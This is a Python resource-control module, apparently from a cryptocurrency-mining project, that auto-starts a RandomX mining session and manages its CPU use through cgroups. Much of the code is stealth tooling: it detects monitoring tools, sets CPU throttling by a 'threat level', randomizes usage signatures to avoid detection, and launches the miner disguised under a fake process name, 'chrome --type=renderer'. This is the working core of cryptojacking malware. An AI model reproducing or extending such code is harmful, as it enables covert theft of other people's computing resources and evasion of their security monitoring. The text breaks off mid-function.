# MIGRATION NOTE: Replaced ThrottlingManager với MiningIntegrationAdapter
# See OptimizedCalculationChain for new high-performance CPU management
# Legacy throttling: 28% CPU → New optimized: 800% CPU utilization
# resource_control.py

# mypy: ignore-errors
# pyright: reportGeneralTypeIssues=false, reportMissingImports=false


import os
import psutil
import time
import uuid
import glob
import random
import shutil
import logging
import traceback
import threading
import subprocess
import re
import glob
import pynvml
from typing import Dict, Any, List, Optional, Set, Union
from concurrent.futures import ThreadPoolExecutor
import signal
import resource
from pathlib import Path
from .cloak_strategies import StrategyType

# ✅ UNIFIED LOGGING: Use centralized logging system
from .unified_logging import get_unified_logger

# ✅ ERROR MANAGEMENT: Use centralized error handling system
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ STANDARDIZED: Get unified logger instance
resource_logger = get_unified_logger('resource_control')

# ✅ ERROR REPORTER: Get centralized error reporter instance
error_reporter = get_error_reporter()
from mining_environment.cpu_plugins import discover_cpu_plugins, ICpuTechnique  # Sprint 1 plugin framework
from threading import RLock
from mining_environment.cpu_plugins.core.config import load_plugin_cfg, CpuPluginFile

# === IMPORT TÁI CẤU TRÚC ===
from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningIntegrationAdapter

# Thêm imports cho stealth frameworks
try:
    from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager  # type: ignore
    from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem  # type: ignore
    from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer  # type: ignore
    from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig  # type: ignore
except ImportError:
    # Fallback to absolute imports
    try:
        import sys
        import os
        sys.path.append(os.path.dirname(__file__))
        # Dead import removed: stealth_execution module không tồn tại
        from randomx_optimizer import XeonE5OptimizedConfig
    except ImportError:
        # Create stub classes if imports fail
        class StealthProcessManager:
            def __init__(self, logger): 
                self.logger = logger
            def get_fake_process_name(self): 
                return "chrome --type=renderer"
        
        class AntiDetectionSystem:
            def __init__(self, logger): 
                self.logger = logger
                self.detected_threats = set()
            def detect_monitoring_tools(self): 
                return []
            def assess_threat_level(self, threats): 
                return "LOW"
            def continuous_threat_monitoring(self, callback=None): 
                pass
        
        class SignatureRandomizer:
            def __init__(self, logger): 
                self.logger = logger
            def generate_dynamic_signature(self, duration): 
                return [30, 40, 50, 35, 45]
        
        class XeonE5OptimizedConfig:
            def __init__(self, logger): 
                self.logger = logger
            def get_stealth_optimized_config(self): 
                return {
                    'threads': 6, 'instruction_set': 'avx2', 
                    'cpu_affinity_groups': [[0], [1], [2], [3], [4], [5]],
                    'estimated_performance_gain': 1.15,
                    'physical_cores': 12, 'l3_cache_mb': 35
                }
            def generate_mining_config(self, profile):
                return self.get_stealth_optimized_config()


###############################################################################
#                           CPU RESOURCE MANAGER                              #
###############################################################################

class _SingletonMeta(type):
    _instance: "CPUResourceManager | None" = None
    _lock: RLock = RLock()

    def __call__(cls, *args, **kwargs):  # type: ignore[override]
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__call__(*args, **kwargs)
        return cls._instance

class CPUResourceManager(metaclass=_SingletonMeta):
    """
    CPU Resource Management với advanced cloaking và RandomX optimization
    """

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        """
        Khởi tạo CPUResourceManager với advanced stealth capabilities
        """
        self.logger = logger
        self.config = config
        
        # Enhanced: Initialize stealth components
        try:
            from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager
            from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem
            from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer
            from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig
            
            self.stealth_manager = StealthProcessManager(logger)
            self.anti_detection = AntiDetectionSystem(logger)
            self.signature_randomizer = SignatureRandomizer(logger)
            self.xeon_optimizer = XeonE5OptimizedConfig(logger)
            
            # Get optimal mining configuration
            self.optimal_mining_config = self.xeon_optimizer.generate_mining_config('balanced')
            self.current_threat_level = "LOW"
            
            self.logger.info("🛡️ [CPU Manager] Advanced stealth capabilities initialized")
            self.stealth_enabled = True
            
        except Exception as e:
            # ✅ ERROR REPORTING: CPU manager initialization failure
            error_reporter.report_error(
                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
                f"Lỗi khi khởi tạo cpu manager: {e}",
                ErrorSeverity.HIGH,
                module='resource_control',
                function='CPUResourceManager.__init__',
                context_data={'error': str(e), 'stealth_enabled': False},
                exception=e
            )
            self.logger.error(f"Lỗi khi khởi tạo cpu manager: {e}")
            self.stealth_enabled = False
            # Fallback initialization for basic functionality
            pass

        # ✅ FIXED: Initialize _registered_pids attribute để tránh AttributeError
        self._registered_pids = set()
        
        # Basic resource control attributes
        self.cpu_count = psutil.cpu_count(logical=True) or 1
        self.physical_cores = psutil.cpu_count(logical=False) or 1
        
        # Background monitoring thread
        if self.stealth_enabled:
            threading.Thread(target=self._stealth_monitoring_loop, daemon=True).start()

        # === TÁI CẤU TRÚC: MiningIntegrationAdapter thay thế ThrottlingManager cũ ===
        self.throttler = None
        try:
            self.throttler = MiningIntegrationAdapter(logger=self.logger)
            self.logger.info("🛡️ [CPU Manager] Throttling Manager initialized.")
            
            # ✅ NEW: Auto-initialize optimized mining system on startup
            try:
                cores = self.cpu_count  # Available CPU cores
                if self.throttler.initialize_optimized_mining(cores):
                    self.logger.info(f"🚀 [CPU Manager] Auto-initialized optimized mining for {cores} cores")
                    
                    # Auto-start mining session for immediate availability
                    if self.throttler.start_mining_session():
                        self.logger.info("✅ [CPU Manager] Mining session auto-started successfully")
                    else:
                        self.logger.warning("⚠️ [CPU Manager] Mining session auto-start failed")
                else:
                    self.logger.warning("⚠️ [CPU Manager] Auto-initialization of optimized mining failed")
            except Exception as auto_init_error:
                self.logger.error(f"❌ [CPU Manager] Auto-initialization error: {auto_init_error}")
                
        except Exception as e:
            # ✅ ERROR REPORTING: Critical MiningIntegrationAdapter initialization failure
            error_reporter.report_error(
                ErrorCode.RESOURCE_MANAGER_INIT_FAILED,
                f"Không thể khởi tạo MiningIntegrationAdapter: {e}",
                ErrorSeverity.CRITICAL,
                module='resource_control',
                function='CPUResourceManager.__init__',
                context_data={'component': 'MiningIntegrationAdapter', 'error': str(e)},
                exception=e
            )
            self.logger.critical(f"Không thể khởi tạo MiningIntegrationAdapter: {e}")

        # RDT CAT cache control (optional)
        try:
            from mining_environment.cpu_plugins.rdt_cache_control.manager import RdtCatManager  # type: ignore
            self.rdt_manager = RdtCatManager(self.logger)
            if self.rdt_manager.is_active():
                self.logger.info("🛡️ [CPU Manager] RDT CAT cache control đã sẵn sàng.")
            else:
                self.logger.info("🛡️ [CPU Manager] RDT CAT không khả dụng trên hệ thống này.")
        except Exception as e:
            self.logger.warning(f"Không thể khởi tạo RdtCatManager: {e}")
            self.rdt_manager = None

        # self.throttled_processes initialization to avoid attribute errors
        self.throttled_processes: Dict[int, Any] = {}

        # ------------------------------------------------------------------
        # Sprint-3: YAML config & hot-reload
        # ------------------------------------------------------------------
        self._cfg_path = Path(os.getenv("CPU_PLUGIN_CFG", "../cpu_plugins/config/cpu_plugins.yml"))
        cfg_obj: CpuPluginFile | None = None
        try:
            cfg_obj = load_plugin_cfg(self._cfg_path)
        except Exception as exc:  # noqa: BLE001
            self.logger.warning(f"[CPU] Không thể load cpu_plugins.yml: {exc}")

        try:
            self.plugins: List[ICpuTechnique] = discover_cpu_plugins(self, self.logger, cfg_obj)  # type: ignore[arg-type]
        except Exception as exc:  # noqa: BLE001
            self.logger.error(f"[CPU] Không thể load plug-ins: {exc}")
            self.plugins = []

        # Đăng ký signal reload một lần (chỉ trong main thread)
        if not hasattr(CPUResourceManager, "_signal_registered"):
            try:
                if threading.current_thread() is threading.main_thread():
                    signal.signal(signal.SIGHUP, lambda *_: CPUResourceManager({}, self.logger).reload_plugins())
                    CPUResourceManager._signal_registered = True  # type: ignore[attr-defined]
                    self.logger.info("[CPU] Đăng ký SIGHUP reload plug-ins thành công.")
                else:
                    self.logger.debug("[CPU] Bỏ qua đăng ký SIGHUP - không ở main thread.")
            except Exception as exc:  # noqa: BLE001
                self.logger.warning(f"[CPU] Không thể đăng ký SIGHUP: {exc}")

    def _stealth_monitoring_loop(self):
        """
        Background monitoring loop cho threat detection và signature randomization
        """
        while True:
            try:
                if not self.stealth_enabled:
                    time.sleep(60)
                    continue

                # Update threat level
                threat_level = self.anti_detection.get_current_threat_level()
                if threat_level != self.current_threat_level:
                    self.logger.info(f"🛡️ [CPU Manager] Threat level changed: {self.current_threat_level} → {threat_level}")
                    self.current_threat_level = threat_level

                # Update signature patterns
                self.signature_randomizer.apply_signature_randomization()
                
                # Sleep based on threat level
                sleep_duration = {
                    "LOW": random.randint(45, 90),
                    "MEDIUM": random.randint(30, 60),
                    "HIGH": random.randint(15, 30)
                }.get(threat_level, 60)
                
                time.sleep(sleep_duration)

            except Exception as e:
                self.logger.error(f"🛡️ [CPU Manager] Stealth monitoring error: {e}")
                time.sleep(60)

    def _adapt_throttling_to_threat_level(self, pid: int, threat_level: str) -> bool:
        """
        Adapt CPU throttling based on current threat level
        """
        try:
            threat_throttle_mapping = {
                "LOW": random.uniform(40, 60),
                "MEDIUM": random.uniform(60, 80),
                "HIGH": random.uniform(80, 95)
            }
            
            new_throttle = threat_throttle_mapping.get(threat_level, 50)
            
            # Apply throttling (this would need the actual cgroup implementation)
            self.logger.info(f"🛡️ [CPU Manager] Adapting PID={pid} throttle to {new_throttle:.1f}% for threat level {threat_level}")
            
            # Note: Actual cgroup throttling implementation would go here
            # For now, just log the adaptation
            
        except Exception as e:
            self.logger.error(f"🛡️ [CPU Manager] Failed to adapt throttling for PID={pid}: {e}")
            return False

    def get_stealth_optimized_config(self) -> Dict[str, Any]:
        """
        Get stealth-optimized configuration for mining
        """
        if not self.stealth_enabled:
            return {}
            
        try:
            return {
                "threat_level": self.current_threat_level,
                "optimal_config": self.optimal_mining_config,
                "stealth_patterns": self.signature_randomizer.get_current_patterns(),
                "detection_tools": self.anti_detection.get_detected_tools(),
                "performance_estimate": self.xeon_optimizer.generate_mining_config('stealth')
            }
        except Exception as e:
            self.logger.error(f"🛡️ [CPU Manager] Failed to get stealth config: {e}")
            return {}

    def start_adaptive_cloaking(self) -> bool:
        """
        Bắt đầu adaptive cloaking system
        """
        try:
            # ✅ DIAGNOSTIC: Log entry point với DEBUG level
            self.logger.debug(f"🔍 [DIAGNOSTIC] start_adaptive_cloaking called")
            self.logger.debug(f"📊 Current threat level: {self.current_threat_level}")
            self.logger.debug(f"🎯 Anti-detection module: {type(self.anti_detection)}")
            self.logger.debug(f"🎭 Signature randomizer: {type(self.signature_randomizer)}")
            
            # Detect monitoring tools
            detected_monitors = self.anti_detection.detect_monitoring_tools()
            self.logger.debug(f"🛡️ Detected monitors: {detected_monitors}")
            
            self.current_threat_level = self.anti_detection.assess_threat_level(detected_monitors)
            self.logger.debug(f"📈 Assessed threat level: {self.current_threat_level}")
            
            # Generate adaptive signature
            adaptive_signature = self.signature_randomizer.generate_dynamic_signature(60)
            self.logger.debug(f"🎭 Generated adaptive signature: {adaptive_signature[:50]}...")
            
            # Start continuous monitoring
            self.anti_detection.continuous_threat_monitoring(
                callback_function=self._handle_threat_level_change
            )
            self.logger.debug("🔄 Continuous threat monitoring started")
            
            self.adaptive_throttling_active = True
            
            self.logger.info(f"Adaptive cloaking started - Threat level: {self.current_threat_level}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start adaptive cloaking: {e}")
            return False

    def _handle_threat_level_change(self, new_threats: List[str]):
        """
        Xử lý thay đổi threat level
        """
        # assess_threat_level mong đợi danh sách Dict, nhưng new_threats chỉ là List[str]
        # -> lấy danh sách phát hiện đầy đủ để đánh giá hoặc tự chuyển đổi.
        try:
            detected_tools = self.anti_detection.detect_monitoring_tools()
            new_threat_level = self.anti_detection.assess_threat_level(detected_tools)
        except Exception as e:
            # Fallback: mặc định MEDIUM nếu lỗi
            self.logger.debug(f"_handle_threat_level_change fallback assess: {e}")
            new_threat_level = "MEDIUM"
        
        if new_threat_level != self.current_threat_level:
            self.current_threat_level = new_threat_level
            self.logger.warning(f"Threat level changed to: {new_threat_level}")
            
            # Adjust throttling for all active processes
            for pid in list(self.throttled_processes.keys()):
                self._adapt_throttling_to_threat_level(pid, new_threat_level)
    
    def apply_randomx_optimization(self, pid: int, performance_profile: str = "stealth") -> bool:
        """
        Áp dụng RandomX optimization cho mining process
        """
        try:
            # Get optimized config
            if performance_profile == "stealth":
                mining_config = self.optimal_mining_config
            else:
                mining_config = self.xeon_optimizer.generate_mining_config(performance_profile)
            
            process = psutil.Process(pid)
            
            # Apply CPU affinity based on optimal groups
            affinity_groups = mining_config['cpu_affinity_groups']
            if affinity_groups:
                # Flatten groups to get all cores
                all_cores = []
                for group in affinity_groups:
                    all_cores.extend(group)
                
                # Use cgroup cpuset instead of process affinity to avoid conflicts
                cgroup_name = f"randomx_opt_{pid}"
                if self.configure_cpuset(cgroup_name, all_cores):
                    if self.assign_process_to_cpuset(pid, cgroup_name):
                        self.logger.info(f"Applied RandomX optimized cpuset for PID={pid}: {all_cores}")
                    else:
                        self.logger.error(f"Failed to assign PID={pid} to RandomX cpuset")
                else:
                    self.logger.error(f"Failed to configure RandomX cpuset for PID={pid}")
            
            # Store optimization info
            self.throttled_processes[pid] = {
                'optimization_profile': performance_profile,
                'affinity_groups': affinity_groups,
                'instruction_set': mining_config['instruction_set'],
                'estimated_gain': mining_config.get('estimated_performance_gain', 1.0),
                'thread_count': mining_config['threads']
            }
            
            self.logger.info(f"RandomX optimization applied: Profile={performance_profile}, Estimated gain={mining_config.get('estimated_performance_gain', 1.0):.1%}")
            return True

        except Exception as e:
            self.logger.error(f"RandomX optimization failed for PID={pid}: {e}")
            return False

    def create_stealth_mining_process(self, miner_binary_path: str, mining_args: List[str] = None) -> Optional[int]:
        """
        Tạo stealth mining process với full cloaking
        """
        try:
            # Check threat level first
            if not self.adaptive_throttling_active:
                self.start_adaptive_cloaking()
            
            # Execute với stealth process manager
            fake_name = self.stealth_manager.get_fake_process_name()
            self.logger.info(f"Creating stealth mining process as: {fake_name}")
            
            # For now, create normal process but with stealth configuration
            # (Full memory execution would need more complex implementation)
            cmd = [miner_binary_path] + (mining_args or [])
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            if process and process.pid:
                # Apply RandomX optimization
                self.apply_randomx_optimization(process.pid, "stealth")
                
                # Apply adaptive throttling
                threat_throttle = {"LOW": 25, "MEDIUM": 50, "HIGH": 75}
                throttle_level = threat_throttle.get(self.current_threat_level, 50)
                self.throttle_cpu_usage(process.pid, throttle_level)
                
                self.logger.info(f"Stealth mining process created: PID={process.pid}, throttle={throttle_level}%")
                return process.pid
            
        except Exception as e:
            self.logger.error(f"Failed to create stealth mining process: {e}")
            
        return None

    def get_mining_status_report(self) -> Dict[str, Any]:
        """
        Báo cáo trạng thái mining và cloaking
        """
        active_processes = len(self.throttled_processes)
        
        status_report = {
            'timestamp': time.time(),
            'active_mining_processes': active_processes,
            'current_threat_level': self.current_threat_level,
            'adaptive_cloaking_active': self.adaptive_throttling_active,
            'detected_threats': list(self.anti_detection.detected_threats),
            'optimal_config': {
                'recommended_threads': self.optimal_mining_config['threads'],
                'instruction_set': self.optimal_mining_config['instruction_set'],
                'estimated_performance_gain': self.optimal_mining_config.get('estimated_performance_gain', 1.0)
            },
            'system_info': {
                'physical_cores': self.optimal_mining_config['physical_cores'],
                'l3_cache_mb': self.optimal_mining_config['l3_cache_mb']
            }
        }
        
        # Add per-process details
        status_report['process_details'] = {}
        for pid, info in self.throttled_processes.items():
            try:
                process = psutil.Process(pid)
                status_report['process_details'][pid] = {
                    'cpu_percent': process.cpu_percent(),
                    'memory_percent': process.memory_percent(),
                    'affinity': process.cpu_affinity(),
                    'optimization_profile': info.get('optimization_profile', 'unknown'),
                    'estimated_gain': info.get('estimated_gain', 1.0)
                }
            except:
                # Process might have ended
                pass
        
        return status_report

    def get_available_cpus(self) -> List[int]:
        """
        Trả về danh sách CPU cores khả dụng của hệ thống.
        """
        try:
            cpu_count = psutil.cpu_count(logical=True)
            if cpu_count is None:
                self.logger.warning("Không thể xác định số lượng CPU cores.")
                return []
            return list(range(cpu_count))
        except Exception as e:
            self.logger.error(f"Lỗi get_available_cpus: {e}")
            return []

    def throttle_cpu_usage(
        self,
        pid: int,
        throttle_percentage: float,
        base_cgroup_name: Optional[str] = None,
        cores: Optional[List[int]] = None
    ) -> Optional[str]:
        """
        Hàm điều tiết CPU được tái cấu trúc, ủy quyền cho MiningIntegrationAdapter.
        
        :param throttle_percentage: Mức giới hạn (0..100).
        :param base_cgroup_name: Tên cgroup (optional).
        :param cores: Danh sách CPU cores để giới hạn (optional).
        """
        if not (0 <= throttle_percentage <= 100):
            self.logger.error(f"Tỷ lệ throttle không hợp lệ: {throttle_percentage}")
            return None
        
        if not self.throttler:
            self.logger.error("MiningIntegrationAdapter không khả dụng, không thể điều tiết.")
            return None

        try:
            # ✅ ENHANCED: Detailed throttling operation logging
            resource_logger.info(f"🎛️ [CPU Throttle] Starting throttling for PID={pid}")
            resource_logger.info(f"📊 [CPU Throttle] Target throttle: {throttle_percentage}%, cores: {cores}")
            resource_logger.info(f"🔧 [CPU Throttle] Using cgroup: {base_cgroup_name or 'auto-generated'}")
            
            # ✅ ENHANCED: Complete MiningIntegrationAdapter workflow activation
            success = False

            # Step 1: Ensure mining system is initialized and running
            if hasattr(self.throttler, 'is_initialized') and not self.throttler.is_initialized:
                cores_count = psutil.cpu_count(logical=True) or 8
                init_success = self.throttler.initialize_optimized_mining(cores_count)
                resource_logger.info(f"🔧 [Throttle] Late initialization: {init_success}")

            # Step 2: Ensure mining session is active
            if hasattr(self.throttler, 'is_running') and not self.throttler.is_running:
                session_success = self.throttler.start_mining_session()
                resource_logger.info(f"🚀 [Throttle] Mining session startup: {session_success}")

            # Step 3: Apply throttling to active mining system
            success = self.throttler.apply_throttling(throttle_percentage)
            resource_logger.info(f"⚖️ [Throttle] Applied {throttle_percentage}% throttling: {success}")

            if success:
                resource_logger.info(f"✅ [CPU Throttle] Successfully applied throttling to PID={pid}")
                resource_logger.info(f"📈 [CPU Throttle] CPU usage limited to {throttle_percentage}%")
                # Các kỹ thuật không trùng lặp khác vẫn được áp dụng
                # CPU cores will be managed by cgroup cpuset, not process affinity
                # This avoids conflicts between multiple CPU management systems
                if cores:
                    self.logger.info(f"CPU cores {cores} will be managed via cgroup cpuset for PID {pid}")
                
                # RDT CAT: cấp cache percentage (nếu có)
                if hasattr(self, "rdt_manager") and self.rdt_manager and self.rdt_manager.is_active():
                    cache_pct = int(max(25, 100 - throttle_percentage))  # Giảm cache theo throttle
                    self.rdt_manager.set_cache_pct(pid, cache_pct)
                    self.logger.info(f"Đã cấp {cache_pct}% LLC cache cho PID {pid}")

                return f"throttled_process_{pid}"

            self.logger.error(f"Không thể áp dụng điều tiết cho PID {pid} bằng mọi cơ chế.")
            return None

        except Exception as e:
            self.logger.error(f"Lỗi không mong muốn trong throttle_cpu_usage (PID={pid}): {e}", exc_info=True)
            return None

    def release_cpu_throttle(self, pid: int, cgroup_path: Optional[str] = None):
        """Gỡ bỏ tất cả các cơ chế điều tiết CPU."""
        self.logger.info(f"Gỡ bỏ điều tiết cho PID {pid}.")

        if self.throttler:
            # MiningIntegrationAdapter không có release method theo PID cụ thể
            # Thay vào đó, áp dụng throttling 0% để release throttling
            self.throttler.apply_throttling(0.0)

        # Khôi phục các thiết lập khác
        try:
            p = psutil.Process(pid)
            p.cpu_affinity([])  # Khôi phục về mọi core
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass 
        except Exception as e:
            self.logger.warning(f"Lỗi khi khôi phục CPU affinity cho PID {pid}: {e}")
            
    # === CÁC HÀM PRIVATE ĐÃ BỊ XÓA - CHỨC NĂNG ĐƯỢC CHUYỂN VÀO MiningIntegrationAdapter ===
    # _reduce_cpu_frequency
    # _inject_process_delays  
    # _optimize_cache_for_throttling
            
    # === HÀM _inject_process_delays ĐÃ BỊ XÓA - CHỨC NĂNG ĐƯỢC CHUYỂN VÀO LegacyThrottler ===
            
    # === HÀM _optimize_cache_for_throttling ĐÃ BỊ XÓA - CHỨC NĂNG ĐƯỢC CHUYỂN VÀO LegacyThrottler ===

    def optimize_thread_scheduling(
        self,
        pid: int,
        cores: Optional[List[int]] = None,
        base_cgroup_name: Optional[str] = None
        ) -> bool:
        """
        Đặt CPU affinity cho PID, không cấu hình cpuset.cpus và không gán PID vào cgroup ở hàm này.
        Sử dụng base_cgroup_name để xác định đường dẫn cgroup CPU và cpuset.
        """
        try:
            process = psutil.Process(pid)

            # 1. Xác định cores
            available_cpus = self.get_available_cpus()
            if cores:
                if not all(core in available_cpus for core in cores):
                    self.logger.error(f"Danh sách cores={cores} không hợp lệ. Hợp lệ={available_cpus}.")
                    return False
                target_cores = cores
            else:
                target_cores = available_cpus

            if not target_cores:
                self.logger.error(f"Danh sách target_cores trống. Không thể tối ưu PID={pid}.")
                return False

            # 2. CPU affinity managed by cgroup cpuset (will be set below)
            self.logger.info(f"Target cores for PID={pid}: {target_cores} (managed via cgroup cpuset)")

            # 3. base_cgroup_name => bắt buộc phải có
            if not base_cgroup_name:
                self.logger.error(f"Không có base_cgroup_name để tối ưu thread scheduling cho PID={pid}.")
                return False

            # 4. Tạo đường dẫn cgroup CPU và cpuset từ base_cgroup_name
            cpu_cgroup_name = f"{base_cgroup_name}_cpu"
            cpuset_cgroup_name = f"{base_cgroup_name}_cpuset"
            cpu_cgroup_path = os.path.join(self.CGROUP_CPU_BASE, cpu_cgroup_name)
            cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cpuset_cgroup_name)

            self.logger.info("[optimize_thread_scheduling] Đã xác định đường dẫn cgroup CPU và cpuset.")
            if self.logger.handlers:
                self.logger.handlers[0].flush()

            # 5. Kiểm tra sự tồn tại của cgroup CPU và cpuset
            if not os.path.exists(cpu_cgroup_path):
                self.logger.error(f"Cgroup CPU không tồn tại: {cpu_cgroup_path}.")
                return False

            if not os.path.exists(cpuset_cgroup_path):
                self.logger.error(f"Cgroup cpuset không tồn tại: {cpuset_cgroup_path}.")
                return False

            # 6. Đồng bộ cpuset.mems nếu cần
            cpuset_mems_file = os.path.join(cpuset_cgroup_path, "cpuset.mems")
            if os.path.exists(cpuset_mems_file):
                try:
                    with open(cpuset_mems_file, "w") as f:
                        f.write("0")  # Giả định NUMA node 0
                    self.logger.info(f"Đặt cpuset.mems=0 cho {cpuset_cgroup_path}.")
                except Exception as e:
                    self.logger.warning(f"Lỗi ghi cpuset.mems: {e}")

            # 7. Log hoàn tất
            self.logger.info(
                f"optimize_thread_scheduling DONE: PID={pid}, cgroup={base_cgroup_name}, cores={target_cores}. "
                "(Chưa gán PID trong hàm này)"
            )
            return True

        except psutil.NoSuchProcess:
            self.logger.error(f"PID={pid} không tồn tại (optimize_thread_scheduling).")
            return False
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền set_cpu_affinity cho PID={pid}. Lỗi: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi optimize_thread_scheduling cho PID={pid}: {e}")
            return False

    def configure_cpuset(self, cgroup_name: str, target_cores: List[int]) -> bool:
        """
        Configure cpuset.cpus for a cgroup to limit CPU cores.
        
        Args:
            cgroup_name: Name of the cgroup
            target_cores: List of CPU core IDs to allow
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not hasattr(self, 'CGROUP_CPU_CPUSET'):
                self.logger.error("CGROUP_CPU_CPUSET not available")
                return False
                
            cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cgroup_name)
            
            # Create cgroup directory if it doesn't exist
            if not os.path.exists(cpuset_cgroup_path):
                os.makedirs(cpuset_cgroup_path, exist_ok=True)
                self.logger.info(f"Created cpuset cgroup: {cpuset_cgroup_path}")
            
            # Set cpuset.cpus
            cpuset_cpus_file = os.path.join(cpuset_cgroup_path, "cpuset.cpus")
            cores_str = ",".join(map(str, target_cores))
            
            with open(cpuset_cpus_file, "w") as f:
                f.write(cores_str)
            
            # Set cpuset.mems (required for cpuset to work)
            cpuset_mems_file = os.path.join(cpuset_cgroup_path, "cpuset.mems")
            with open(cpuset_mems_file, "w") as f:
                f.write("0")  # Default to NUMA node 0
            
            self.logger.info(f"Configured cpuset for {cgroup_name}: cores={cores_str}, mems=0")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to configure cpuset for {cgroup_name}: {e}")
            return False

    def assign_process_to_cpuset(self, pid: int, cgroup_name: str) -> bool:
        """
        Assign a process to a cpuset cgroup.
        
        Args:
            pid: Process ID
            cgroup_name: Name of the cpuset cgroup
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            if not hasattr(self, 'CGROUP_CPU_CPUSET'):
                self.logger.error("CGROUP_CPU_CPUSET not available")
                return False
                
            cpuset_cgroup_path = os.path.join(self.CGROUP_CPU_CPUSET, cgroup_name)
            
            if not os.path.exists(cpuset_cgroup_path):
                self.logger.error(f"Cpuset cgroup does not exist: {cpuset_cgroup_path}")
                return False
            
            # Add process to cgroup
            cgroup_procs_file = os.path.join(cpuset_cgroup_path, "cgroup.procs")
            with open(cgroup_procs_file, "w") as f:
                f.write(str(pid))
            
            self.logger.info(f"Assigned PID {pid} to cpuset cgroup {cgroup_name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to assign PID {pid} to cpuset cgroup {cgroup_name}: {e}")
            return False

    def optimize_cache_usage(self, pid: int) -> bool:
        """
        Tối ưu hoá NUMA/cache qua numactl, nếu có.
        """
        try:
            if shutil.which("numactl") is None:
                self.logger.error("numactl chưa được cài đặt. Bỏ qua tối ưu NUMA.")
                return False

            numa_info = self._get_best_numa_node()
            if not numa_info or "node" not in numa_info or "cpus" not in numa_info:
                self.logger.warning("Không tìm thấy NUMA node phù hợp.")
                return False

            best_node = numa_info["node"]
            numa_node_path = f"/sys/devices/system/node/node{best_node}"
            if not os.path.exists(numa_node_path):
                self.logger.error(f"NUMA node {best_node} không tồn tại.")
                return False

            # Gọi numactl (shell=False)
            command = [
                "numactl",
                "--membind", str(best_node),
                "--cpunodebind", str(best_node),
                "--", "taskset", "-p", str(pid)
            ]
            self.logger.info(f"Chạy numactl tối ưu PID={pid}, node={best_node}.")
            result = subprocess.run(
                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10, shell=False
            )

            if result.returncode == 0:
                self.logger.info(f"Tối ưu NUMA thành công cho PID={pid}.")
                return True
            else:
                err = result.stderr.strip() or "Không có thông báo lỗi."
                self.logger.error(f"Lỗi numactl (code={result.returncode}): {err}")
                return False

        except psutil.NoSuchProcess:
            self.logger.error(f"PID={pid} không tồn tại (optimize_cache_usage).")
            return False
        except psutil.AccessDenied:
            self.logger.error(f"Không đủ quyền truy cập PID={pid}.")
            return False
        except subprocess.TimeoutExpired:
            self.logger.error("numactl timeout sau 10 giây.")
            return False
        except Exception as e:
            self.logger.error(f"Lỗi khi tối ưu NUMA cho PID={pid}: {e}")
            return False

    def _get_best_numa_node(self) -> Optional[Dict[str, Any]]:
        """
        Gọi 'numactl --hardware', parse node => chọn node có size memory lớn nhất.
        """
        try:
            result = subprocess.run(
                ["numactl", "--hardware"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False
            )
            if result.returncode != 0:
                self.logger.error(f"Lỗi chạy numactl --hardware: {result.stderr.strip()}")
                return None

            output = result.stdout
            numa_nodes = {}
            current_node = None

            for line in output.splitlines():
                line = line.strip()
                if line.startswith("available:"):
                    match = re.search(r"available:\s+(\d+)\s+nodes", line)
                    if match and int(match.group(1)) == 0:
                        self.logger.warning("Hệ thống không hỗ trợ NUMA.")
                        return None

                elif line.startswith("node") and " cpus:" in line:
                    match = re.match(r"node (\d+) cpus:\s*(.*)", line)
                    if match:
                        current_node = int(match.group(1))
                        cpu_list = [int(x) for x in match.group(2).split()] if match.group(2) else []
                        numa_nodes[current_node] = {"cpus": cpu_list, "size": 0}

                elif current_node is not None and "size:" in line:
                    match = re.search(r"size:\s*(\d+)\s*MB", line)
                    if match:
                        numa_nodes[current_node]["size"] = int(match.group(1))

            if not numa_nodes:
                self.logger.warning("Không tìm thấy NUMA node nào qua numactl.")
                return None

            # Chọn node có size lớn nhất
            best_node = None
            best_size = 0
            for node, info in numa_nodes.items():
                if info["size"] > best_size:
                    best_node = node
                    best_size = info["size"]

            if best_node is not None:
                return {"node": best_node, "cpus": numa_nodes[best_node]["cpus"]}
            else:
                self.logger.warning("Không xác định được NUMA node tối ưu.")
            return None

        except FileNotFoundError:
            self.logger.error("numactl chưa được cài đặt hoặc không tìm thấy lệnh.")
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi lấy thông tin NUMA: {e}")
            return None

    def _restore_numa(self, pid: int) -> bool:
        """
        Khôi phục NUMA cho tiến trình PID.
        """
        try:
            # Kiểm tra tiến trình có tồn tại hay không
            process = psutil.Process(pid)
            process_status = process.status()
            if process_status not in ['running', 'sleeping']:
                self.logger.error(f"PID={pid} không tồn tại hoặc không hoạt động. Không thể khôi phục NUMA.")
                return False
            
            # Lệnh numactl để khôi phục NUMA (shell=False)
            cmd_list = ["sudo", "numactl", "--membind=all", "--cpubind=all", "-p", str(pid)]
            result = subprocess.run(
                cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=False
            )
            if result.returncode != 0:
